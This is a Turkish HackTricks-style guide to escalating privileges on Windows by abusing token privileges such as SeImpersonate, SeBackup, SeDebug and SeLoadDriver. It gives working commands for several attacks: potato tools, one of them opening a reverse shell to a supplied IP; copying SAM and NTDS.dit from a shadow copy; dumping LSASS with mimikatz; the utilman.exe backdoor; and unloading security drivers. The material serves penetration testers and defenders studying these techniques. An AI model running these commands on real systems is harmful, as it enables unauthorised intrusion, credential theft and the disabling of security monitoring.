# Tokens ile Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Eğer **Windows Access Tokens nedir bilmiyorsanız** devam etmeden önce bu sayfayı okuyun:


{{#ref}}
access-tokens.md
{{#endref}}

**Belki zaten sahip olduğunuz tokens'ları abuse ederek privileges yükseltebilirsiniz**

### SeImpersonatePrivilege

Bu, herhangi bir process tarafından tutulabilen ve ona bir handle alınabildiği sürece herhangi bir tokenın impersonation'ına (ama creation'ına değil) izin veren bir privilege'dır. Privileged bir token, bir Windows service (DCOM)'ten exploit'e karşı NTLM authentication yapması sağlanarak elde edilebilir; bunun ardından SYSTEM privileges ile bir process çalıştırılması mümkün olur. Bu vulnerability, [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (winrm disabled olmasını gerektirir), [SweetPotato](https://github.com/CCob/SweetPotato) ve [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) gibi çeşitli tools kullanılarak exploited edilebilir.

Modern operator notları:

- **JuicyPotato legacy'dir**: Windows 10 1809+/Server 2019+ üzerinde, hâlâ erişilebilir olan RPC/COM surface'e bağlı olarak **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** veya **PrintSpoofer** tercih edin.
- Eğer **`LOCAL SERVICE`** veya **`NETWORK SERVICE`** olarak çalışan bir service'i compromise ettiyseniz ve `whoami /priv` size **filtered token** ile **SeImpersonatePrivilege**/**SeAssignPrimaryTokenPrivilege** içermiyorsa, önce account'un **default privilege set**'ini geri alın (örneğin **FullPowers** ile) ve ardından potato family'yi tekrar deneyin.
- Bazı newer fork'lar, orijinal tools'a göre operator dostudur. Örneğin, **SigmaPotato** reflection/in-memory execution ve modern Windows compatibility ekler, **PrintNotifyPotato** ise PrintNotify COM service'i abuse eder ve classic Spooler path disabled olduğunda sıkça faydalıdır.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege** ile çok benzerdir, ayrıcalıklı bir token elde etmek için **aynı yöntemi** kullanır.\
Ardından, bu privilege bir yeni/suspended process'e **bir primary token atamaya** izin verir. Ayrıcalıklı impersonation token ile bir primary token türetebilirsiniz (DuplicateTokenEx).\
Token ile, 'CreateProcessAsUser' kullanarak **yeni bir process** oluşturabilir veya bir process'i suspended olarak oluşturup token'ı **set** edebilirsiniz (genelde, çalışan bir process'in primary token'ını değiştiremezsiniz).

### SeTcbPrivilege

Bu token etkinse **KERB_S4U_LOGON** kullanarak kimlik bilgilerini bilmeden herhangi başka bir kullanıcı için bir **impersonation token** elde edebilir, tokene isteğe bağlı bir group (admins) **ekleyebilir**, token'ın **integrity level** değerini "**medium**" olarak ayarlayabilir ve bu token'ı **current thread**'e atayabilirsiniz (SetThreadToken).

### SeBackupPrivilege

Bu privilege, sistemin herhangi bir dosya için **tüm read access** kontrolünü (read operations ile sınırlı olarak) vermesine neden olur. Registry'den **local Administrator** hesaplarının parola hash'lerini **okumak** için kullanılır; ardından hash ile "**psexec**" veya "**wmiexec**" gibi tools kullanılabilir (Pass-the-Hash technique). Ancak, bu technique iki durumda başarısız olur: Local Administrator hesabı disabled olduğunda veya uzaktan bağlanan Local Administrators'tan administrative rights'ları kaldıran bir policy uygulandığında.\
Pratikte, en güvenilir built-in workflow genellikle **VSS + `robocopy /b`**'dir: bir shadow copy oluşturun/erişin, ardından `SAM`/`SYSTEM` veya `NTDS.dit` dosyasını **backup mode**'da kopyalayın; bu, file ACLs'i bypass eder.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Bu ayrıcalığı şu yollarla **kötüye kullanabilirsiniz**:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- **IppSec**'i şu videoda takip ederek: [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Veya şu bölümde açıklandığı gibi: **escalating privileges with Backup Operators**:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Bu ayrıcalık, dosyanın Access Control List (ACL)'inden bağımsız olarak herhangi bir sistem dosyasına **yazma erişimi** izni sağlar. Birçok yükseltme olasılığı açar; buna **servisleri değiştirme**, DLL Hijacking yapma ve diğer çeşitli tekniklerin yanı sıra Image File Execution Options üzerinden **debuggers** ayarlama da dahildir.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege güçlü bir izindir; özellikle bir kullanıcı token impersonation yapma yeteneğine sahip olduğunda faydalıdır, ancak SeImpersonatePrivilege yokluğunda da işe yarar. Bu yetenek, aynı kullanıcıyı temsil eden ve integrity level değeri mevcut prosesin integrity level değerini aşmayan bir token'ı impersonate edebilme yeteneğine dayanır.

**Önemli Noktalar:**

- **SeImpersonatePrivilege olmadan impersonation:** Belirli koşullar altında EoP için SeCreateTokenPrivilege kullanılarak token impersonation yapılabilir.
- **Token impersonation için koşullar:** Başarılı impersonation için hedef token'ın aynı kullanıcıya ait olması ve impersonation girişiminde bulunan prosesin integrity level değerinden küçük ya da ona eşit bir integrity level'a sahip olması gerekir.
- **Impersonation token'larının oluşturulması ve değiştirilmesi:** Kullanıcılar bir impersonation token oluşturabilir ve buna ayrıcalıklı bir grubun SID (Security Identifier) değerini ekleyerek geliştirebilir.

### SeLoadDriverPrivilege

Bu ayrıcalık, `ImagePath` ve `Type` için belirli değerlerle bir registry girdisi oluşturularak **device driver'ları yükleme ve kaldırma** izni verir. `HKLM` (HKEY_LOCAL_MACHINE) için doğrudan yazma erişimi kısıtlı olduğundan, bunun yerine `HKCU` (HKEY_CURRENT_USER) kullanılmalıdır. Ancak `HKCU`'nun kernel tarafından driver yapılandırması için tanınması adına belirli bir yol izlenmelidir.

Modern offensive kullanım genellikle **BYOVD** (bring your own vulnerable driver) şeklindedir: **imzalı ama vulnerable** bir kernel driver yüklenir ve ardından IOCTL'leri kullanılarak protections devre dışı bırakılır veya kernel code execution'a geçilir. Unutmayın ki son Windows 11/Server sürümlerinde **Microsoft vulnerable driver blocklist** ve/veya **HVCI/Memory Integrity** çoğu zaman eski public zincirlerini bozar; bu yüzden klasik `szkg64.sys` tarzı örnekler artık her zaman güvenilir değildir.

Bu yol `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` şeklindedir; burada `<RID>` mevcut kullanıcının Relative Identifier değeridir. `HKCU` içinde bu yolun tamamı oluşturulmalı ve iki değer ayarlanmalıdır:

- `ImagePath`, çalıştırılacak binary'nin yolu
- `Type`, değeri `SERVICE_KERNEL_DRIVER` (`0x00000001`) olacak şekilde.

**İzlenecek Adımlar:**

1. Kısıtlı yazma erişimi nedeniyle `HKLM` yerine `HKCU`'ya erişin.
2. `HKCU` içinde `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` yolunu oluşturun; burada `<RID>` mevcut kullanıcının Relative Identifier değerini temsil eder.
3. `ImagePath`'i binary'nin execution path'ine ayarlayın.
4. `Type` değerini `SERVICE_KERNEL_DRIVER` (`0x00000001`) olarak atayın.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Bu ayrıcalığı kötüye kullanmanın daha fazla yolu için [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Bu, **SeRestorePrivilege** ile benzerdir. Birincil işlevi, bir işlemin **bir nesnenin sahipliğini üstlenmesine** olanak tanır ve WRITE_OWNER erişim haklarının sağlanması yoluyla açık ayrık erişim gereksinimini aşar. Süreç, önce yazma amacıyla hedef registry key’in sahipliğini güvence altına almayı, ardından write operations’ı etkinleştirmek için DACL’yi değiştirmeyi içerir.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Bu privilege, **debug other processes** yapmaya izin verir; buna bellekte okuma ve yazma da dahildir. Bu privilege ile, çoğu antivirus ve host intrusion prevention solution’ı atlatabilen çeşitli memory injection stratejileri kullanılabilir.

Modern Windows’ta, `SeDebugPrivilege` genellikle **non-protected SYSTEM processes** açmak ve token’larını duplicate etmek için yeterlidir, ancak **LSASS**’a erişebileceğinizin bir garantisi **değildir**. Eğer **RunAsPPL / LSA Protection** etkinse, non-protected processes, `SeDebugPrivilege` olsa bile LSASS’ı okuyamaz veya içine inject edemez. Bu durumda, başka bir non-PPL SYSTEM process’ten token çalın veya `procdump`’ın çalışacağını varsaymak yerine bir PPL bypass/BYOVD ile zincirleyin. `SeDebugPrivilege` + `SeImpersonatePrivilege` kullanarak tam bir token-copy örneği için [bu sayfaya](sedebug-+-seimpersonate-copy-token.md) bakın.

#### Dump memory

Belleğini **capture** etmek için [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)’u [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) içinden kullanabilirsiniz. Özellikle bu, kullanıcı bir sisteme başarıyla giriş yaptıktan sonra kullanıcı credential’larını saklamaktan sorumlu olan **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process’i için uygulanabilir.

Daha sonra bu dump’ı mimikatz içinde yükleyerek password’leri elde edebilirsiniz:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Eğer bir `NT SYSTEM` shell elde etmek istiyorsanız şunları kullanabilirsiniz:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Bu hak (Perform volume maintenance tasks), NTFS ACLs’i atlayan doğrudan disk I/O için raw volume device handle’larını (ör. \\.\C:) açmaya izin verir. Bununla, alttaki blokları okuyarak volume üzerindeki herhangi bir dosyanın byte’larını kopyalayabilir, böylece hassas materyallerin keyfi file read işlemini mümkün kılar (ör. %ProgramData%\Microsoft\Crypto\ içindeki machine private keys, registry hives, SAM/NTDS via VSS). Bu özellikle CA servers üzerinde etkilidir; çünkü CA private key’inin exfiltrating edilmesi, herhangi bir principal’i impersonate etmek için Golden Certificate forging yapmayı mümkün kılar.

Detaylı teknikler ve mitigations için:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
**Disabled** olarak görünen tokenlar genellikle etkinleştirilebilir, bu yüzden çoğu zaman hem _Enabled_ hem de _Disabled_ ayrıcalıklarını kötüye kullanabilirsiniz.

### Tüm tokenları etkinleştir

Eğer disabled privileges varsa, [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) scriptini kullanarak tüm tokenları etkinleştirebilirsiniz:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ---------------------------| ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Read sensitive files with `robocopy /b` or dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` ve bazen `%WINDIR%\MEMORY.DMP` için harikadır.<br><br>- `robocopy` kullanışlıdır, ancak özel SeBackup cmdlets/APIs kilitli/açık dosyalar için çoğu zaman daha esnektir.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` ile local admin rights dahil herhangi bir token oluştur.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token'ını kopyala veya protected olmayan bir process'ten bellek dump al.                                                                                                                                                                                                                                                                 | <p>LSASS dumping genellikle RunAsPPL/LSA Protection etkinse engellenir.</p><p>Script şu adreste bulunabilir [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation kullanarak SYSTEM başlat (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, vb.).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled tasks veya zaten `SeImpersonatePrivilege` sahibi olan herhangi bir context gibi service accounts üzerinden en pratiktir.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. İmzalı ama vulnerable bir kernel driver yükle (BYOVD)<br>2. Driver'ın IOCTL'lerini kullanarak kernel R/W elde et, security tooling'i devre dışı bırak veya SYSTEM'e yüksel<br><br>Alternatif olarak, privilege `fltMC` builtin command ile security ile ilgili driver'ları kaldırmak için kullanılabilir, yani <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> gibi eski public driver'lar, modern Windows'ta vulnerable-driver blocklist / HVCI tarafından giderek daha fazla engelleniyor.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege mevcut halde PowerShell/ISE başlat.<br>2. Privilege'ı <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> ile etkinleştir).<br>3. utilman.exe adını utilman.old olarak değiştir<br>4. cmd.exe adını utilman.exe olarak değiştir<br>5. console'u kilitle ve Win+U'ya bas</p> | <p>Attack bazı AV software tarafından tespit edilebilir.</p><p>Alternatif method, aynı privilege kullanılarak "Program Files" içinde saklanan service binaries'nin değiştirilmesine dayanır</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe adını utilman.exe olarak değiştir<br>4. console'u kilitle ve Win+U'ya bas</p>                                                                                                                                       | <p>Attack bazı AV software tarafından tespit edilebilir.</p><p>Alternatif method, aynı privilege kullanılarak "Program Files" içinde saklanan service binaries'nin değiştirilmesine dayanır.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>local admin rights içerecek şekilde token'ları manipüle et. SeImpersonate gerekebilir.</p><p>Doğrulanmalı.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Windows tokens tanımlayan bu tabloya bir göz atın: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- token'larla privesc hakkında [**bu paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)'a bir göz atın.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode file/folder ACL checks'i bypass eder): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
